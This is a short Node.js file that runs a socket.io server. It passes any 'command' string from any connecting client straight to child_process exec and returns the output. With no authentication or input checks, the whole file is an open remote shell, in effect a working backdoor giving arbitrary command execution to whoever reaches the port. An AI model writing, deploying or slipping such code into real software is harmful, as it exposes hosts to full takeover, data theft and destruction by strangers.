import { exec } from 'child_process';
import { Server } from "socket.io";

async function handle(){
    const server = new Server()

    console.log(process.env.PORT)

    const handler = server.listen(Number(process.env.PORT))

    console.log('Listening...')

    handler.on("connection", (socket) => {
        socket.on("command", (command) => {
            console.log('Receiving command: ', command);
    
            exec(command, (error, stdout, stderr) => {
                if(error){
                    socket.emit("result", error.message)
                    return;
                }
    
                if(stderr) {
                    socket.emit("result", stderr)
                    return;
                }
                
                console.log('Sending result: ', stdout)
                socket.emit('result', stdout)
            })
        })
    })
}

handle()